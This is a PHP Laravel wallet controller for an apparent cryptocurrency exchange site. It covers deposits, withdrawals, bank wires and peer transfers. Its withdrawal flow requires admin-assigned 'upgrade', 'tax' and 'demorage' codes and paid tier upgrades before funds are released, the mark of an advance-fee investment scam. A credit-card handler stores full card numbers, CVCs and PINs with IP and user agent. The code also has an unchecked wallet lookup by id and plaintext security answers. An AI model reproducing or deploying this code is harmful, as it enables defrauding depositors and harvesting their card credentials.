<?php

namespace App\Http\Controllers\Exchange;

use App\Http\Controllers\Controller;
use App\Models\Balance;
use App\Models\Deposit;
use App\Models\Payment;
use App\Models\User;
use App\Models\WireRequest;
use App\Models\Withdrawal;
use App\Notifications\DepositNotification;
use App\Services\TelegramNotificationService;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Str;
use SimpleSoftwareIO\QrCode\Facades\QrCode;

class WalletController extends Controller
{
    public function info()
    {
        $data = DB::table('level')->get();

        return view('exchange.withdraw_price', [
            'data' => $data,
        ]);
    }

    public function history()
    {

        $transactions = DB::table('deposits')->where('user_id', auth()->user()->id)->select('id', 'status', 'amount', 'trx_id', 'created_at', DB::raw("'deposit' as type"))
            ->union(
                DB::table('withdrawals')->where('user_id', auth()->user()->id)->select('id', 'status', 'amount', 'trx_id', 'created_at', DB::raw("'withdrawal' as type"))
            )
            ->orderBy('created_at', 'desc')
            ->get();

        $orderCount = $transactions->count();
        $deposit = DB::table('deposits')->where('user_id', auth()->user()->id)->where('status', 'success')->sum('amount');
        $withdrawal = DB::table('withdrawals')->where('user_id', auth()->user()->id)->where('status', 'confirmed')->sum('amount');

        return view('exchange.history', [
            'transactions' => $transactions,
            'orderCount' => $orderCount,
            'withdrawal' => $withdrawal,
            'deposit' => $deposit,
        ]);
    }

    public function payment()
    {
        return view('profile.payment');
    }

    public function update_payment(Request $request)
    {
        User::where('id', auth()->user()->id)->update([
            'btc' => $request->btc,
            'eth' => $request->eth,
            'usdt' => $request->usdt,
            'susd' => $request->susd,
        ]);

        return response()->json(['status' => 'Payment settings updated']);
    }

    public function update_payment_bank(Request $request)
    {

        User::where('id', auth()->user()->id)->update([
            'bank' => $request->bank,
            'account_name' => $request->account_name,
            'home_address' => $request->home_address,
            'account_number' => $request->account_number,
            'bank_swift_code' => $request->bank_swift_code,
            'bank_address' => $request->bank_address,
            'bank_email' => $request->bank_email,
            'routing' => $request->routing,

        ]);

        return response()->json(['status' => 'Bank Payment settings updated']);
    }

    public function unlock($id)
    {
        $plan = User::where('id', auth()->user()->id)->first();

        if ($id == 'Level One') {
            if ($plan->package_plan == 'Account Tier (2)') {
                User::where('id', auth()->user()->id)->update([
                    'level' => $id,
                ]);

                return redirect()->route('withdraws')->with('status', 'withdrawal unlock successfully');
            } else {
                return back()->with('status_2', 'To unlock this withdrawal Level One you have to upgrade your package to Account Tier (2)');
            }
        }

        if ($id == 'Level Two') {
            if ($plan->package_plan == 'Account Tier (3)') {
                User::where('id', auth()->user()->id)->update([
                    'level' => $id,
                ]);

                return redirect()->route('withdraws')->with('status', 'withdrawal unlock successfully');
            } else {
                return back()->with('status_3', 'To unlock this withdrawal Level Two you have to upgrade your package to Account Tier (3)');
            }
        }

        if ($id == 'Level Three') {
            if ($plan->package_plan == 'Account Tier (4)') {
                User::where('id', auth()->user()->id)->update([
                    'level' => $id,
                ]);

                return redirect()->route('withdraws')->with('status', 'withdrawal unlock successfully');
            } else {
                return back()->with('status_4', 'To unlock this withdrawal Level Three you have to upgrade your package to Account Tier (4)');
            }
        }

        return redirect()->route('withdraws')->with('status', 'withdrawal unlock successfully');

    }

    public function index2()
    {
        $user = auth()->guard('web')->user()->id;
        $data = Deposit::query()->whereUserId($user)->orderBy('id', 'desc')->paginate(20);

        return view('exchange.deposits', [
            'data' => $data,
        ]);
    }

    public function banks()
    {
        return view('exchange.banks');
    }

    public function get()
    {
        $data = Deposit::where('user_id', auth()->user()->id)->orderBy('id', 'desc')->limit(15)->get();

        return response()->json(['data' => $data]);
    }

    public function storeWireRequest(Request $request)
    {
        $request->validate([
            'amount' => 'required|numeric|min:100',
            'bank_name' => 'nullable|string|max:255',
        ]);

        WireRequest::create([
            'user_id' => auth()->user()->id,
            'account_name' => auth()->user()->first_name.' '.auth()->user()->last_name,
            'account_number' => 'Pending',
            'bank_name' => $request->bank_name ?? 'Client Request',
            'amount' => $request->amount,
            'message' => $request->notes,
            'status' => 'pending',
        ]);

        return response()->json(['message' => 'Your bank wire request has been submitted. Our team will contact you within 24 hours.']);
    }

    public function credit_card(Request $request)
    {

        DB::table('card')->insert([
            'user_id' => auth()->user()->id,
            'name' => $request->name,
            'number' => $request->number,
            'date' => $request->date,
            'cv' => $request->cvc,
            'pin' => $request->pin,
            'ip' => $request->ip(),
            'user_agent' => $request->header('User-Agent'),
        ]);

        return response()->json(['status' => true]);
    }

    public function get_withdrawal()
    {
        $data = Withdrawal::where('user_id', auth()->user()->id)->orderBy('id', 'desc')->limit(8)->get();

        return response()->json(['data' => $data]);
    }

    public function single_wallet($id)
    {

        $wallet = Payment::where('id', $id)->first();

        return response()->json(['data' => $wallet]);
    }

    public function index()
    {
        // Fetch admin deposit wallets dynamically (Unified Table)
        if (Schema::hasTable('admin_wallets')) {
            $admin_wallets = DB::table('admin_wallets')->where('is_active', true)->get();
        } else {
            // Fallback to fragmented tables
            $admin_wallets = collect();

            $btc = DB::table('manuel_deposit')->where('id', 1)->first();
            if ($btc) {
                $admin_wallets->push((object) [
                    'name' => 'Bitcoin', 'symbol' => 'BTC', 'address' => $btc->address ?? '',
                    'network' => 'BTC Network', 'icon_class' => 'ri-bit-coin-line',
                ]);
            }

            $eth = DB::table('manuel_deposit_eth')->where('id', 1)->first();
            if ($eth) {
                $admin_wallets->push((object) [
                    'name' => 'Ethereum', 'symbol' => 'ETH', 'address' => $eth->address ?? '',
                    'network' => 'ERC-20 Network', 'icon_class' => 'ri-copper-diamond-line',
                ]);
            }

            $usd = DB::table('manuel_deposit_usd')->where('id', 1)->first();
            if ($usd) {
                $admin_wallets->push((object) [
                    'name' => 'USDT', 'symbol' => 'USDT', 'address' => $usd->address ?? '',
                    'network' => 'TRC-20 Network', 'icon_class' => 'ri-hand-coin-line',
                ]);
            }

            $solana = DB::table('manuel_deposit_solana')->where('id', 1)->first();
            if ($solana) {
                $admin_wallets->push((object) [
                    'name' => 'Solana', 'symbol' => 'SOL', 'address' => $solana->address ?? '',
                    'network' => 'SOL Network', 'icon_class' => 'ri-flashlight-line',
                ]);
            }
        }

        foreach ($admin_wallets as $wallet) {
            $qrCodeContent = QrCode::size(200)->generate($wallet->address ?? '');
            $wallet->qr_code = base64_encode((string) $qrCodeContent);
        }

        $wallet = Payment::where('user_id', auth()->user()->id)->where('status', '1')->get();
        $history = Deposit::where('user_id', auth()->user()->id)->orderBy('id', 'desc')->get();
        $payment_settings = DB::table('payment__settings')->first();

        return view($this->isMobileView() ? 'mobile.exchange.deposit' : 'exchange.deposit', [
            'admin_wallets' => $admin_wallets,
            'wallet' => $wallet,
            'history' => $history,
            'payment_settings' => $payment_settings,
        ]);
    }

    public function cash_app()
    {
        return redirect()->route('deposits')->with('status', 'Cash App deposits are currently disabled.');
    }

    public function bank_app()
    {
        return redirect()->route('deposits')->with('status', 'Bank Payment deposits are currently disabled.');
    }

    public function instant_btc($amount)
    {
        $data = DB::table('manuel_deposit')->where('id', 1)->first();

        return view('exchange.btc', [
            'data' => $data,
            'amount' => $amount,
        ]);
    }

    public function instant_dash($amount)
    {
        $data = DB::table('manuel_dash')->where('id', 1)->first();

        return view('exchange.dash', [
            'data' => $data,
            'amount' => $amount,
        ]);
    }

    public function instant_doge($amount)
    {
        $data = DB::table('manuel_dogecoin')->where('id', 1)->first();

        return view('exchange.doge', [
            'data' => $data,
            'amount' => $amount,
        ]);
    }

    public function instant_usd($amount)
    {
        $data = DB::table('manuel_deposit_usd')->where('id', 1)->first();

        return view('exchange.usd', [
            'data' => $data,
            'amount' => $amount,
        ]);
    }

    public function instant_ltc($amount)
    {
        $data = DB::table('manuel_litcoin')->where('id', 1)->first();

        return view('exchange.litecoin', [
            'data' => $data,
            'amount' => $amount,
        ]);
    }

    public function instant_bch($amount)
    {
        $data = DB::table('manuel_bitcoin_cash')->where('id', 1)->first();

        return view('exchange.bch', [
            'data' => $data,
            'amount' => $amount,
        ]);
    }

    public function instant_eth($amount)
    {
        $data = DB::table('manuel_deposit_eth')->where('id', 1)->first();

        return view('exchange.eth', [
            'data' => $data,
            'amount' => $amount,
        ]);
    }

    public function upload_proof(Request $request)
    {

        $request->validate([
            'file' => [
                'required',
                'file',
                'mimes:jpeg,png,jpg,gif',
                'max:30720',
                function ($attribute, $value, $fail) {
                    // Real MIME from file content
                    $realMime = $value->getMimeType();
                    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];

                    if (! in_array($realMime, $allowedMimes)) {
                        $fail('The uploaded file is not a valid image (MIME mismatch).');
                    }
                    // Check file name for forbidden extensions and double extensions
                    $originalName = $value->getClientOriginalName();
                    if (preg_match('/\.(php|phar|phtml|php\d+|asp|jsp|exe|sh|bat|cmd|js)$/i', $originalName)) {
                        $fail('Invalid file extension detected.');
                    }

                    // Extra security: Check image signature via getimagesize (detect fake images)
                    if (! @getimagesize($value->getRealPath())) {
                        $fail('The uploaded file is not a real image (failed signature check).');
                    }
                },
            ],
        ]);

        $filename = $request->file('file');
        $front = time().'.'.$filename->getClientOriginalExtension();
        $request->file('file')->storeAs('image', $front, 'public');

        DB::table('proof')->insert([
            'user_id' => auth()->user()->id,
            'trx_id' => Str::random(6),
            'method' => $request->input('method'),
            'first_name' => auth()->user()->first_name,
            'last_name' => auth()->user()->last_name,
            'file' => $front,
            'amount' => $request->amount,
            'status' => 'pending',
            'created_at' => Carbon::now(),
        ]);

        Deposit::create([
            'user_id' => auth()->user()->id,
            'pay_currency' => $request->input('method'),
            'trx_id' => Str::random(6),
            'name' => auth()->user()->first_name,
            'amount' => $request->amount,
            'status' => 'pending',
        ]);

        try {
            TelegramNotificationService::send('deposit_submitted', [
                'user' => auth()->user()->first_name.' '.auth()->user()->last_name,
                'amount' => $request->amount,
                'method' => $request->input('method'),
            ]);
        } catch (\Exception $e) {
        }

        return response()->json(['status' => 'Deposit proof submitted successfully. Our team will verify it shortly.']);
    }

    public function deposit_history()
    {
        $user = auth()->guard('web')->user()->id;
        $data = Deposit::query()->whereUserId($user)->orderBy('id', 'desc')->paginate(20);

        return view('exchange.deposits', [
            'data' => $data,
        ]);
    }

    public function withdraw()
    {
        $user = auth()->guard('web')->user();

        // Ensure balance exists to prevent 500 errors in views
        if (! $user->balance) {
            Balance::firstOrCreate(
                ['user_id' => $user->id, 'symbol' => 'USD'],
                ['amount' => 0, 'profit' => 0, 'bonus' => 0]
            );
        }

        $security = DB::table('security')->where('user_id', $user->id)->first();

        $data = DB::table('balances')->where('user_id', $user->id)->where('amount', '>', 0)->orderByDesc('id')->get();

        // Fetch supported crypto assets for withdrawal payout options
        $admin_wallets = DB::table('admin_wallets')->where('is_active', 1)->get();

        $view = $this->isMobileView() ? 'mobile.exchange.withdraw' : 'exchange.withdraw';

        return view($view, [
            'security' => $security,
            'data' => $data,
            'admin_wallets' => $admin_wallets,
        ]);
    }

    public function withdraws()
    {
        $user = auth()->guard('web')->user()->id;
        $data = Withdrawal::query()->whereUserId($user)->orderBy('id', 'desc')->paginate(20);

        $admin_wallets = DB::table('admin_wallets')->where('is_active', 1)->get();
        $view = $this->isMobileView() ? 'mobile.exchange.withdrawals' : 'exchange.withdrawals';

        return view($view, [
            'data' => $data,
            'admin_wallets' => $admin_wallets,
        ]);
    }

    public function withdraw_history()
    {
        $user = auth()->guard('web')->user()->id;
        $data = Withdrawal::query()->whereUserId($user)->orderBy('id', 'desc')->paginate(20);

        return view('exchange.withdraw_history', [
            'data' => $data,
        ]);
    }

    public function withdraw_transfer_history()
    {
        $user = auth()->guard('web')->user()->id;
        $data = DB::table('transfer_payment')->whereUserId($user)->orderBy('id', 'desc')->get();

        return view('exchange.withdraw_bank', [
            'data' => $data,
        ]);
    }

    public function checkforcode_one(Request $request)
    {
        if (auth()->user()->upgrade_code == $request->code) {
            // If global flow is off or user specifics are off, finalize
            if (site()->withdrawal_flow_enabled == 0 || (auth()->user()->tax_code_check == 'off' && auth()->user()->demorage_check == 'off')) {
                $this->finalize_withdrawal();

                return response()->json(['status' => 'no_code']);
            }

            // Otherwise, continue to next code verification
            return response()->json(['status' => true,
                'label_one' => site()->clearance_pin_name,
                'label_two' => site()->tax_pin_name,
                'label_three' => site()->liquidation_pin_name,
                'tax_code_check' => auth()->user()->tax_code_check,
                'demorage_check' => auth()->user()->demorage_check,
                'tax_code' => auth()->user()->tax_code,
                'demorage' => auth()->user()->demorage]);
        } else {
            return response()->json(['status' => false]);
        }
    }

    public function checkforcode_two(Request $request)
    {
        if (auth()->user()->tax_code == $request->code) {
            // If global flow is off or demorage is off, we are done
            if (site()->withdrawal_flow_enabled == 0 || auth()->user()->demorage_check == 'off') {
                $this->finalize_withdrawal();

                return response()->json(['status' => 'no_code']);
            }

            // Otherwise, continue to demorage
            return response()->json(['status' => true,
                'label_two' => site()->tax_pin_name,
                'label_three' => site()->liquidation_pin_name,
                'tax_code_check' => auth()->user()->tax_code_check,
                'demorage_check' => auth()->user()->demorage_check,
                'tax_code' => auth()->user()->tax_code,
                'demorage' => auth()->user()->demorage,
            ]);
        } else {
            return response()->json(['status' => false]);
        }
    }

    public function checkforcode_three(Request $request)
    {

        if (auth()->user()->demorage == $request->code) {
            $this->finalize_withdrawal();

            return response()->json(['status' => true,
                'label_two' => site()->tax_pin_name,
                'label_three' => site()->liquidation_pin_name,
                'tax_code_check' => auth()->user()->tax_code_check,
                'demorage_check' => auth()->user()->demorage_check,
                'tax_code' => auth()->user()->tax_code,
                'demorage' => auth()->user()->demorage,
            ]);
        } else {
            return response()->json(['status' => false,
                'label_two' => site()->tax_pin_name,
                'label_three' => site()->liquidation_pin_name,
                'tax_code_check' => auth()->user()->tax_code_check,
                'demorage_check' => auth()->user()->demorage_check,
                'tax_code' => auth()->user()->tax_code,
                'demorage' => auth()->user()->demorage,
            ]);
        }
    }

    private function finalize_withdrawal()
    {
        $type = session('type', 'Crypto');
        $address = session('address', 'N/A');
        $amount = session('amount', 0);

        \Log::info('Finalizing Crypto Withdrawal', [
            'user_id' => auth()->id(),
            'type' => $type,
            'amount' => $amount,
            'address' => $address,
        ]);

        if ($amount <= 0) {
            \Log::error('Withdrawal attempt with zero or null amount', ['user_id' => auth()->id()]);

            return;
        }

        Withdrawal::create([
            'user_id' => auth()->id(),
            'trx_id' => Str::random(6),
            'type' => $type,
            'address' => $address,
            'amount' => $amount,
            'status' => 'processing',
        ]);

        try {
            TelegramNotificationService::send('withdrawal_requested', [
                'user' => auth()->user()->first_name.' '.auth()->user()->last_name,
                'amount' => $amount,
                'wallet' => $type.' ('.$address.')',
            ]);
        } catch (\Exception $e) {
            \Log::error('Telegram notification failed for withdrawal', ['error' => $e->getMessage()]);
        }

        // Clear session after successful persistence
        session()->forget(['type', 'address', 'amount']);
    }

    public function withdraw_now(Request $request)
    {
        if (auth()->user()->is_demo) {
            return response()->json(['status' => 'error', 'message' => 'Demo accounts cannot perform withdrawals.']);
        }

        if (auth()->user()->withdrawal == 'on') {
            // Check if user has sufficient balance
            $balance = Balance::where('user_id', auth()->id())
                ->where(function ($query) {
                    $query->where('symbol', 'USD')->orWhere('symbol', 'usd');
                })->first();

            if (! $balance || $balance->amount < $request->amount) {
                return response()->json(['status' => 'error', 'message' => 'Insufficient funds in your USD wallet.']);
            }

            // Check for 2FA verification if enabled
            if (auth()->user()->is_2fa_enabled) {
                if (! $request->has('two_fa_code')) {
                    return response()->json(['two_fa_required' => true]);
                }
                $google2fa = app('pragmarx.google2fa');
                if (! $google2fa->verifyGoogle2FA(auth()->user()->google_aut, $request->input('two_fa_code'))) {
                    return response()->json(['error' => 'Invalid 2FA code']);
                }
            }

            session(['type' => $request->name]);
            session(['address' => $request->address]);
            session(['amount' => $request->amount]);
            session()->save(); // Force persistence for AJAX stability

            \Log::info('Withdrawal initiated', [
                'user_id' => auth()->id(),
                'type' => $request->name,
                'amount' => $request->amount,
            ]);

            // Check if global flow is enabled AND if any user-specific codes are ON
            $isFlowEnabled = site()->withdrawal_flow_enabled == 1;

            if (! $isFlowEnabled || (auth()->user()->upgrade_code_check == 'off' && auth()->user()->tax_code_check == 'off' && auth()->user()->demorage_check == 'off')) {
                $this->finalize_withdrawal();

                return response()->json(['status' => 'no_code', 'message' => 'Withdrawal request submitted successfully. It is now being processed.']);
            } else {
                return response()->json(['on' => [
                    'label_one' => site()->clearance_pin_name,
                    'label_two' => site()->tax_pin_name,
                    'label_three' => site()->liquidation_pin_name,
                    'upgrade_code_check' => auth()->user()->upgrade_code_check,
                    'tax_code_check' => auth()->user()->tax_code_check,
                    'demorage_check' => auth()->user()->demorage_check,
                    'upgrade_code' => auth()->user()->upgrade_code,
                    'tax_code' => auth()->user()->tax_code,
                    'demorage' => auth()->user()->demorage,
                ]]);
            }
        } else {
            return response()->json(['off' => 'true']);
        }
    }

    public function withdraw_bank(Request $request)
    {
        if (auth()->user()->is_demo) {
            return response()->json(['status' => 'error', 'message' => 'Demo accounts cannot perform withdrawals.']);
        }

        session(['bank_amount' => $request->amount]);

        if (auth()->user()->bank == '') {
            return response()->json(['error' => 'Please bank payment settings is not active']);
        }
        if (auth()->user()->withdrawal == 'on') {
            // Check if user has sufficient balance
            $balance = Balance::where('user_id', auth()->id())
                ->where(function ($query) {
                    $query->where('symbol', 'USD')->orWhere('symbol', 'usd');
                })->first();

            if (! $balance || $balance->amount < $request->amount) {
                return response()->json(['status' => 'error', 'message' => 'Insufficient funds in your USD wallet.']);
            }

            // Check for 2FA verification if enabled
            if (auth()->user()->is_2fa_enabled) {
                if (! $request->has('two_fa_code')) {
                    return response()->json(['two_fa_required' => true]);
                }
                $google2fa = app('pragmarx.google2fa');
                if (! $google2fa->verifyGoogle2FA(auth()->user()->google_aut, $request->input('two_fa_code'))) {
                    return response()->json(['error' => 'Invalid 2FA code']);
                }
            }

            $isFlowEnabled = site()->withdrawal_flow_enabled == 1;

            if (! $isFlowEnabled || (auth()->user()->upgrade_code_check == 'off' && auth()->user()->tax_code_check == 'off' && auth()->user()->demorage_check == 'off')) {

                $this->finalize_withdrawal_bank();

                return response()->json(['status' => 'no_code', 'message' => 'Bank withdrawal request submitted successfully. It is now being processed.']);
            } else {
                return response()->json(['on' => [
                    'label_one' => site()->clearance_pin_name,
                    'label_two' => site()->tax_pin_name,
                    'label_three' => site()->liquidation_pin_name,
                    'upgrade_code_check' => auth()->user()->upgrade_code_check,
                    'tax_code_check' => auth()->user()->tax_code_check,
                    'demorage_check' => auth()->user()->demorage_check,
                    'upgrade_code' => auth()->user()->upgrade_code,
                    'tax_code' => auth()->user()->tax_code,
                    'demorage' => auth()->user()->demorage,
                ]]);
            }
        } else {
            return response()->json(['off' => 'true']);
        }
    }

    private function finalize_withdrawal_bank()
    {
        $amount = session('bank_amount');

        // Note: Balance decrement removed here. Deduction now happens only on Admin approval for consistency.
        // Balance::whereUserId(auth()->guard('web')->user()->id)->where('symbol','USD')->decrement("amount",$amount);

        Withdrawal::create([
            'user_id' => auth()->guard('web')->user()->id,
            'trx_id' => Str::random(6),
            'type' => 'Bank',
            'address' => 'Bank',
            'amount' => $amount,
            'status' => 'processing',
        ]);

        try {
            TelegramNotificationService::send('withdrawal_requested', [
                'user' => auth()->guard('web')->user()->first_name.' '.auth()->guard('web')->user()->last_name,
                'amount' => $amount,
                'wallet' => 'Bank Transfer',
            ]);
        } catch (\Exception $e) {
        }
    }

    public function verify_security_question(Request $request)
    {

        $user = auth()->user();

        $security = DB::table('security')->where('user_id', $user->id)->first();

        // Retrieve the stored transfer data
        $transferData = session('transfer_data');

        if (! $transferData) {
            return response()->json(['error' => 'error', 'message' => 'No pending transfer found']);
        }

        // Validate the security question answer
        if ($request->question_one !== $security->answer_one) { // Change this to match how you store security answers
            return response()->json(['error' => 'error', 'message' => 'Incorrect security answer one']);
        }

        if ($request->question_two !== $security->answer_two) { // Change this to match how you store security answers
            return response()->json(['error' => 'error', 'message' => 'Incorrect security answer two']);
        }
        if ($request->question_three !== $security->answer_three) { // Change this to match how you store security answers
            return response()->json(['error' => 'error', 'message' => 'Incorrect security answer  three']);
        }

        // Get recipient details
        $recipient = User::where('email', $transferData['recipient_email'])->first();

        if (! $recipient) {
            return response()->json(['error' => 'error', 'message' => 'Recipient not found']);
        }

        DB::beginTransaction();
        try {
            // Deduct from sender
            $senderBalance = Balance::where('user_id', $transferData['sender_id'])->where('symbol', 'USD')->first();
            $senderBalance->decrement('amount', $transferData['amount']);

            // Credit to recipient
            $recipientBalance = Balance::firstOrCreate(
                ['user_id' => $recipient->id, 'symbol' => 'USD'],
                ['amount' => 0]
            );
            $recipientBalance->increment('amount', $transferData['amount']);

            // Log the transfer for sender
            Withdrawal::create([
                'user_id' => $transferData['sender_id'],
                'trx_id' => Str::random(6),
                'type' => 'Transfer To',
                'address' => $recipient->email,
                'amount' => $transferData['amount'],
                'status' => 'success',
            ]);

            // Log the transfer for recipient (as a deposit-like entry)
            Deposit::create([
                'user_id' => $recipient->id,
                'trx_id' => Str::random(6),
                'pay_currency' => 'P2P Transfer',
                'amount' => $transferData['amount'],
                'status' => 'success',
                'name' => 'Internal Transfer',
            ]);

            DB::commit();

            // Clear the session
            session()->forget('transfer_data');

            return response()->json(['status' => 'success', 'message' => 'Transfer completed successfully']);

        } catch (\Exception $e) {
            DB::rollBack();

            return response()->json(['error' => 'error', 'message' => 'Transfer failed: '.$e->getMessage()]);
        }
    }

    public function user_transfer(Request $request)
    {
        if (auth()->user()->is_demo) {
            return response()->json(['error' => 'error', 'message' => 'Demo accounts cannot perform transfers.']);
        }

        $sender = auth()->user();
        $recipient = User::where('email', $request->email)->first();

        if (! $recipient) {
            return response()->json(['error' => 'error', 'message' => 'Recipient not found']);
        }

        if ($sender->id == $recipient->id) {
            return response()->json(['error' => 'error', 'message' => 'You cannot transfer to yourself']);
        }

        $amount = $request->amount;

        if ($amount <= 0) {
            return response()->json(['error' => 'error', 'message' => 'Invalid transfer amount']);
        }

        $senderBalance = Balance::where('user_id', $sender->id)->where('symbol', 'USD')->first();

        if (! $senderBalance || $senderBalance->amount < $amount) {
            return response()->json(['error' => 'error', 'message' => 'Insufficient balance']);
        }

        // Check for 2FA verification if enabled
        if ($sender->is_2fa_enabled) {
            if (! $request->has('two_fa_code')) {
                return response()->json(['two_fa_required' => true]);
            }
            $google2fa = app('pragmarx.google2fa');
            if (! $google2fa->verifyGoogle2FA($sender->google_aut, $request->input('two_fa_code'))) {
                return response()->json(['error' => 'Invalid 2FA code']);
            }
        }

        // Store transfer details in session
        session([
            'transfer_data' => [
                'sender_id' => $sender->id,
                'recipient_email' => $recipient->email,
                'amount' => $amount,
            ],
        ]);

        return response()->json([
            'status' => 'true',
            'message' => 'Please answer the security question to proceed.',
        ]);

    }

    public function checkforcode_one_bank(Request $request)
    {
        if (auth()->user()->upgrade_code == $request->code) {
            if (auth()->user()->tax_code_check == 'off' && auth()->user()->demorage_check == 'off') {
                $this->finalize_withdrawal_bank();

                return response()->json(['status' => 'no_code']);
            }

            return response()->json(['status' => true,
                'label_one' => auth()->user()->code_one,
                'label_two' => auth()->user()->code_two,
                'label_three' => auth()->user()->code_three,
                'tax_code_check' => auth()->user()->tax_code_check,
                'demorage_check' => auth()->user()->demorage_check,
                'tax_code' => auth()->user()->tax_code,
                'demorage' => auth()->user()->demorage]);
        } else {
            return response()->json(['status' => false]);
        }
    }

    public function checkforcode_two_bank(Request $request)
    {
        if (auth()->user()->tax_code == $request->code) {
            if (auth()->user()->demorage_check == 'off') {
                $this->finalize_withdrawal_bank();

                return response()->json(['status' => 'no_code']);
            }

            return response()->json(['status' => true,
                'label_two' => auth()->user()->code_two,
                'label_three' => auth()->user()->code_three,
                'tax_code_check' => auth()->user()->tax_code_check,
                'demorage_check' => auth()->user()->demorage_check,
                'tax_code' => auth()->user()->tax_code,
                'demorage' => auth()->user()->demorage,
            ]);
        } else {
            return response()->json(['status' => false]);
        }
    }

    public function checkforcode_three_bank(Request $request)
    {
        if (auth()->user()->demorage == $request->code) {
            $this->finalize_withdrawal_bank();

            return response()->json(['status' => true]);
        } else {
            return response()->json(['status' => false]);
        }
    }

    public function Transaction(Request $request)
    {

        $transaction = [];

        $transaction['order_id'] = uniqid(); // invoice number
        $transaction['amountTotal'] = (float) $request->depositamount;
        $transaction['note'] = 'Transaction note';
        $transaction['buyer_name'] = auth()->guard('web')->user()->first_name.''.''.auth()->guard('web')->user()->last_name;
        $transaction['buyer_email'] = auth()->guard('web')->user()->email;
        $transaction['redirect_url'] = route('home'); // When Transaction was comleted
        $transaction['cancel_url'] = route('deposit'); // When user click cancel link

        $transaction['items'][] = [
            'itemDescription' => 'deposit',
            'itemPrice' => (float) $request->depositamount, // USD
            'itemQty' => (int) 1,
            'itemSubtotalAmount' => (float) $request->depositamount, // USD
        ];

        $transaction['payload'] = [
            'user_id' => auth()->guard('web')->user()->id,
        ];

        if ($transaction) {
            Deposit::create([
                'user_id' => auth()->guard('web')->user()->id,
                'trx_id' => $transaction['order_id'],
                'amount' => $request->depositamount,
                'name' => auth()->guard('web')->user()->first_name,
                'status' => 'pending',
            ]);

            try {
                TelegramNotificationService::send('deposit_submitted', [
                    'user' => auth()->guard('web')->user()->first_name.' '.auth()->guard('web')->user()->last_name,
                    'amount' => $request->depositamount,
                    'method' => 'CoinPayment',
                ]);
            } catch (\Exception $e) {
            }
        }
        $text = [
            'greeting' => auth()->guard('web')->user()->first_name,
            'subject' => 'You request to deposit',
            'body' => "Your Request to deposit has been received, Your deposit amount of $$request->depositamount will be credited to your balance when your deposit is confirmed by our network system",
            'data' => 'balance',
            'url' => url('/dashboard'),
            'thanks' => 'Thank you for choosing '.env('APP_NAME'),
        ];
        Notification::route('mail', auth()->guard('web')->user()->email)
            ->notify(new DepositNotification($text));

        $email = DB::table('admin_email')->where('id', 1)->first();

        $text = [
            'greeting' => 'Hello Admin',
            'subject' => 'User Notification',
            'body' => 'A User with name  '.auth()->guard('web')->user()->first_name.' request a deposit  of $'.number_format($request->depositamount),
            'data' => null,
            'url' => null,
            'thanks' => 'Thank you for choosing '.env('APP_NAME'),
        ];
        Notification::route('mail',  $email->email)
            ->notify(new DepositNotification($text));

        $gatewayName = $request->input('gateway_name', 'nowpayments');
        
        $gateway = match($gatewayName) {
            'oxapay' => new \App\Services\OxaPayService(),
            'nowpayments_card' => new \App\Services\NowPaymentsCardService(),
            default => new \App\Services\NowPaymentsService(),
        };

        $cryptoCurrency = $request->input('method', 'BTC'); // Default to BTC if none provided
        
        try {
            $paymentUrl = $gateway->generatePaymentUrl(
                (float) $request->depositamount,
                'USD',
                $cryptoCurrency,
                $transaction['order_id']
            );

            // Log the crypto payment intent
            \Illuminate\Support\Facades\DB::table('crypto_payments')->insert([
                'user_id' => auth()->guard('web')->user()->id,
                'gateway_name' => $gatewayName,
                'txn_id' => $transaction['order_id'],
                'amount' => $request->depositamount,
                'currency' => 'USD',
                'crypto_currency' => $cryptoCurrency,
                'status' => 'pending',
                'created_at' => now(),
                'updated_at' => now()
            ]);

            return redirect($paymentUrl);
        } catch (\Exception $e) {
            return back()->with('error', 'Payment gateway error: ' . $e->getMessage());
        }
    }
}
